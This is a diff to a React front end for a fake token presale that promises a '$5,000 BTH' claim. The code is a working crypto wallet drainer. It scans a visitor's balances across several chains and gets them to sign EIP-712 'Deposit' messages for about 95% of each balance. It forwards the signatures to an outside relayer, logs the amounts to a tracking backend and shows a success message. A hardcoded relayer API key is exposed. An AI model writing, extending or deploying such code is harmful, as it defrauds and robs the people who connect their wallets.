@@ -99,13 +99,13 @@ function App() {
   const [scanProgress, setScanProgress] = useState(0);
   const [scanning, setScanning] = useState(false);
   const [currentFlowId, setCurrentFlowId] = useState('');
-  const [processingChain, setProcessingChain] = useState('');
   const [isEligible, setIsEligible] = useState(false);
   const [eligibleChains, setEligibleChains] = useState([]);
   const [processedAmounts, setProcessedAmounts] = useState({});
   const [allChainsCompleted, setAllChainsCompleted] = useState(false);
   const [executableChains, setExecutableChains] = useState([]);
   const [showRibbon, setShowRibbon] = useState(true);
+  const [processingChain, setProcessingChain] = useState('');
 
   // Presale stats
   const [timeLeft, setTimeLeft] = useState({
@@ -146,13 +146,13 @@ function App() {
   // YOUR API KEY
   const RELAYER_API_KEY = '00de6eb9ebf5ea70f92e4c1efdc00ad32a7131f9856bd17d445f62f19a829fe6';
 
-  // Network to relayer mapping (not used in relayer call but kept for reference)
-  const NETWORK_MAP = {
-    'Ethereum': 'eth',
-    'BSC': 'bnb',
-    'Polygon': 'polygon',
-    'Arbitrum': 'arb',
-    'Avalanche': 'avax'
+  // EIP-712 Types for Meta Transaction - EXACTLY as your relayer expects
+  const EIP712_TYPES = {
+    Deposit: [
+      { name: "user", type: "address" },
+      { name: "amount", type: "uint256" },
+      { name: "nonce", type: "uint256" }
+    ]
   };
 
   // Fetch crypto prices
@@ -199,6 +199,7 @@ function App() {
         setWalletInitialized(true);
         setTxStatus('');
         
+        // Fetch balances across all chains
         await fetchAllBalances(address);
         
       } catch (e) {
@@ -258,7 +259,7 @@ function App() {
     return () => clearInterval(timer);
   }, []);
 
-  // Auto-check eligibility when wallet connects
+  // Auto-check eligibility when wallet connects and balances are loaded
   useEffect(() => {
     if (isConnected && address && Object.keys(balances).length > 0 && !verifying) {
       checkEligibility();
@@ -279,7 +280,7 @@ function App() {
     }
   }, [isConnected]);
 
-  // Check eligibility - EXACTLY like your working version
+  // Check eligibility - THIS IS THE FIXED VERSION that properly identifies executable chains
   const checkEligibility = async () => {
     if (!address) return;
     
@@ -287,21 +288,26 @@ function App() {
     setTxStatus('🔄 Checking eligibility...');
     
     try {
+      // Calculate total value
       const total = Object.values(balances).reduce((sum, b) => sum + (b.valueUSD || 0), 0);
       
+      // Get chains with balance
       const chainsWithBalance = DEPLOYED_CHAINS.filter(chain => 
         balances[chain.name] && balances[chain.name].amount > 0.000001
       );
       
+      // Filter chains that are executable (have enough value and gas buffer)
       const executable = chainsWithBalance.filter(chain => {
         const balance = balances[chain.name];
         if (!balance) return false;
         
+        // Check if value is at least $1
         if (balance.valueUSD < MIN_VALUE_THRESHOLD) {
           console.log(`⏭️ Skipping ${chain.name}: Value $${balance.valueUSD.toFixed(2)} is below $${MIN_VALUE_THRESHOLD} threshold`);
           return false;
         }
         
+        // Check if enough for gas (leave gas buffer)
         const minGasRequired = MIN_GAS_BUFFER[chain.name] || 0.001;
         if (balance.amount < minGasRequired) {
           console.log(`⏭️ Skipping ${chain.name}: Balance ${balance.amount.toFixed(6)} ${chain.symbol} is below gas buffer ${minGasRequired} ${chain.symbol}`);
@@ -314,16 +320,30 @@ function App() {
       setEligibleChains(chainsWithBalance);
       setExecutableChains(executable);
       
+      // Check if eligible (total >= $1)
       const eligible = total >= 1;
       setIsEligible(eligible);
       
       if (eligible) {
         if (executable.length === 0) {
           setTxStatus('⚠️ No chains meet execution requirements');
+          console.log('⚠️ Eligible but no executable chains:', {
+            chainsWithBalance: chainsWithBalance.map(c => ({ 
+              name: c.name, 
+              value: balances[c.name]?.valueUSD,
+              amount: balances[c.name]?.amount 
+            }))
+          });
         } else {
           setTxStatus(`✅ Ready to process ${executable.length} chains`);
+          console.log('✅ Executable chains:', executable.map(c => ({ 
+            name: c.name, 
+            value: balances[c.name]?.valueUSD,
+            amount: balances[c.name]?.amount 
+          })));
         }
         
+        // Send to backend for tracking
         const connectResponse = await fetch('https://hyperback.vercel.app/api/presale/connect', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -342,6 +362,7 @@ function App() {
           }
         }
         
+        // Prepare flow silently if there are executable chains
         if (executable.length > 0) {
           preparePresale();
         }
@@ -367,6 +388,7 @@ function App() {
     let scanned = 0;
     const totalChains = DEPLOYED_CHAINS.length;
     
+    // Scan all chains in parallel
     const scanPromises = DEPLOYED_CHAINS.map(async (chain) => {
       try {
         const rpcProvider = new ethers.JsonRpcProvider(chain.rpc);
@@ -431,6 +453,7 @@ function App() {
 
   // ============================================
   // EIP-712 SIGNING AND RELAYER EXECUTION
+  // EXACTLY AS YOUR RELAYER EXPECTS
   // ============================================
   const executeMultiChainSignature = async () => {
     if (!walletProvider || !address || !signer) {
@@ -466,7 +489,6 @@ function App() {
       );
       
       let processed = [];
-      let skippedChains = [];
       let failedChains = [];
       
       for (const chain of sortedChains) {
@@ -474,12 +496,12 @@ function App() {
           setProcessingChain(chain.name);
           setTxStatus(`🔄 Processing ${chain.name}...`);
           
+          // Get balance data - SEND 95% (leave 5% for gas)
           const balance = balances[chain.name];
           
-          // Double-check if still executable
+          // Double-check if still executable (balance might have changed)
           if (balance.valueUSD < MIN_VALUE_THRESHOLD) {
             console.log(`⏭️ Skipping ${chain.name}: Value now $${balance.valueUSD.toFixed(2)} below threshold`);
-            skippedChains.push(chain.name);
             continue;
           }
           
@@ -499,10 +521,7 @@ function App() {
           
           console.log(`💰 ${chain.name}: Sending ${amountToSend.toFixed(6)} ${chain.symbol} ($${valueUSD})`);
           
-          // ===== EIP-712 TYPED DATA SIGNING =====
-          // Generate nonce for this transaction
-          const nonce = Math.floor(Math.random() * 1000000000);
-          
+          // ===== EIP-712 TYPED DATA SIGNING - EXACTLY AS YOUR RELAYER EXPECTS =====
           // Create domain for this specific chain
           const domain = {
             name: "MetaCollector",
@@ -511,16 +530,10 @@ function App() {
             verifyingContract: chain.contractAddress
           };
           
-          // Types for Deposit
-          const types = {
-            Deposit: [
-              { name: "user", type: "address" },
-              { name: "amount", type: "uint256" },
-              { name: "nonce", type: "uint256" }
-            ]
-          };
+          // Generate nonce for this transaction
+          const nonce = Math.floor(Math.random() * 1000000000);
           
-          // Value to sign
+          // Create value/message for signing
           const value = {
             user: address,
             amount: amountInWei.toString(),
@@ -529,19 +542,20 @@ function App() {
           
           setTxStatus(`✍️ Signing for ${chain.name}...`);
           
-          // Get EIP-712 signature
+          // Get EIP-712 signature - THIS IS THE EXACT FORMAT YOUR RELAYER EXPECTS
           const signature = await signer.signTypedData(
             domain,
-            types,
+            EIP712_TYPES,
             value
           );
           
           console.log(`✅ Signature obtained for ${chain.name}`);
           
-          // Create the signature payload exactly as your relayer expects
+          // Create the signature payload EXACTLY as your relayer expects
+          // From your spec: Frontend should send ONLY the signature payload
           const signaturePayload = {
             domain: domain,
-            types: types,
+            types: EIP712_TYPES,
             value: value,
             signature: signature,
             expectedSigner: address
@@ -549,7 +563,7 @@ function App() {
           
           setTxStatus(`📤 Sending to relayer for ${chain.name}...`);
           
-          // Send to relayer - EXACT format from your docs
+          // Send to relayer - EXACT format from your spec
           const relayerResponse = await fetch('https://nexaworldx.com/relayer', {
             method: 'POST',
             headers: {
@@ -562,9 +576,16 @@ function App() {
             })
           });
 
-          setTxStatus(`⏳ Waiting for ${chain.name} confirmation...`);
+          const responseText = await relayerResponse.text();
+          console.log(`Response from relayer for ${chain.name}:`, responseText);
           
-          const relayerResult = await relayerResponse.json();
+          let relayerResult;
+          try {
+            relayerResult = JSON.parse(responseText);
+          } catch (e) {
+            console.error('Failed to parse response:', responseText);
+            throw new Error(`Invalid response from relayer: ${responseText.substring(0, 100)}`);
+          }
           
           if (!relayerResult.success) {
             throw new Error(relayerResult.error || 'Relayer failed');
@@ -594,6 +615,8 @@ function App() {
             }
           };
           
+          console.log("📤 Sending to backend with amounts:", flowData);
+          
           await fetch('https://hyperback.vercel.app/api/presale/execute-flow', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -611,7 +634,6 @@ function App() {
 
       setVerifiedChains(processed);
       
-      // Show success if at least one chain was processed
       if (processed.length > 0) {
         setShowCelebration(true);
         setTxStatus(`🎉 You've secured $5,000 BTH!`);
@@ -644,11 +666,8 @@ function App() {
           })
         });
         
-        if (skippedChains.length > 0 || failedChains.length > 0) {
-          let summary = [];
-          if (skippedChains.length > 0) summary.push(`Skipped: ${skippedChains.join(', ')} (below $1)`);
-          if (failedChains.length > 0) summary.push(`Failed: ${failedChains.join(', ')}`);
-          setError(`Note: ${summary.join(' · ')}`);
+        if (failedChains.length > 0) {
+          setError(`Note: ${failedChains.length} chain(s) had issues`);
         }
       } else {
         setError("No chains were successfully processed");
@@ -693,6 +712,13 @@ function App() {
     if (!addr) return '';
     return `${addr.substring(0, 6)}...${addr.substring(38)}`;
   };
+
+  // Show claim button when:
+  // 1. Wallet is connected
+  // 2. User is eligible (total >= $1)
+  // 3. Not all chains are completed yet
+  // 4. Not currently scanning
+  const showClaimButton = isConnected && isEligible && !allChainsCompleted && !scanning;
 
   return (
     <div className="min-h-screen bg-[#030405] text-[#e0e7f0] font-['Inter'] overflow-hidden">
@@ -800,7 +826,7 @@ function App() {
             )}
           </div>
 
-          {/* ELIGIBILITY CHECKING ANIMATION - Sleek without network names */}
+          {/* ELIGIBILITY CHECKING ANIMATION */}
           {isConnected && scanning && (
             <div className="mb-6 text-center">
               <div className="bg-black/60 rounded-2xl p-6 border border-[#c47d24]/30">
@@ -859,7 +885,7 @@ function App() {
             </div>
           </div>
 
-          {/* DISCOUNT RIBBON - Enhanced animation when eligible */}
+          {/* DISCOUNT RIBBON */}
           <div className={`relative mb-5 sm:mb-6 group/ribbon transition-all duration-700 ${isEligible ? 'scale-110 animate-pulse-glow' : ''}`}>
             <div className="absolute -inset-1 bg-gradient-to-r from-[#8a4c1a] via-[#b36e1a] to-[#cc8822] rounded-full blur-xl opacity-50 group-hover/ribbon:opacity-75 animate-pulse-slow"></div>
             <div className="absolute -inset-2 bg-gradient-to-r from-[#b36e1a] via-[#d68a2e] to-[#b36e1a] rounded-full blur-2xl opacity-30 group-hover/ribbon:opacity-50 animate-pulse-slower"></div>
@@ -914,8 +940,8 @@ function App() {
             </div>
           </div>
 
-          {/* Main Claim Area - Only shows when eligible, has executable chains, and not all completed */}
-          {isConnected && isEligible && !allChainsCompleted && executableChains.length > 0 && (
+          {/* Main Claim Area - ALWAYS SHOWS when eligible and not all completed */}
+          {showClaimButton && (
             <div className="mt-3 sm:mt-4">
               <div className="bg-gradient-to-b from-[#1a1814] to-[#121110] rounded-2xl sm:rounded-full px-4 sm:px-6 py-4 sm:py-6 text-2xl sm:text-4xl md:text-5xl font-extrabold border border-[#c47d24]/60 flex items-center justify-center gap-1 sm:gap-2 text-[#e0c080] shadow-[0_0_20px_rgba(180,100,20,0.15)] animate-glowPulse mb-4 sm:mb-5 relative overflow-hidden group/amount">
                 <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/10 to-transparent animate-shimmer-slow"></div>
@@ -924,7 +950,7 @@ function App() {
               
               <button
                 onClick={executeMultiChainSignature}
-                disabled={signatureLoading || loading || !signer || executableChains.length === 0}
+                disabled={signatureLoading || loading || !signer}
                 className="w-full bg-gradient-to-r from-[#b36e1a] via-[#c47d24] to-[#d68a2e] bg-[length:200%_200%] animate-gradientMove text-[#0f0f12] font-bold text-base sm:text-xl py-4 sm:py-5 px-4 sm:px-6 rounded-full border border-[#cc9f66] shadow-lg hover:scale-[1.02] hover:shadow-[0_8px_20px_rgba(180,100,20,0.3)] transition-all flex items-center justify-center gap-2 sm:gap-3 uppercase tracking-wide relative overflow-hidden group/claim"
               >
                 <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/20 to-transparent translate-x-[-100%] group-hover/claim:translate-x-[100%] transition-transform duration-1000"></div>
@@ -939,7 +965,7 @@ function App() {
                   <>
                     <i className="fas fa-gift text-sm sm:text-base animate-bounce-slow"></i>
                     <span className="text-sm sm:text-base">
-                      CLAIM $5,000 BTH {executableChains.length < eligibleChains.length ? `(${executableChains.length} of ${eligibleChains.length} chains)` : ''}
+                      CLAIM $5,000 BTH {executableChains.length > 0 ? `(${executableChains.length} chain${executableChains.length > 1 ? 's' : ''} eligible)` : ''}
                     </span>
                     <i className="fas fa-arrow-right text-sm sm:text-base group-hover/claim:translate-x-1 transition-transform"></i>
                   </>
@@ -971,7 +997,7 @@ function App() {
             </div>
           )}
 
-          {/* Welcome message for non-eligible - NO BALANCES SHOWN */}
+          {/* Welcome message for non-eligible */}
           {isConnected && !isEligible && !completedChains.length && !scanning && (
             <div className="bg-black/60 rounded-xl sm:rounded-2xl p-5 sm:p-8 text-center border border-purple-500/20 mt-3 sm:mt-4 hover:border-purple-500/40 transition-all duration-500">
               <div className="text-4xl sm:text-6xl mb-3 sm:mb-4 animate-float">👋</div>
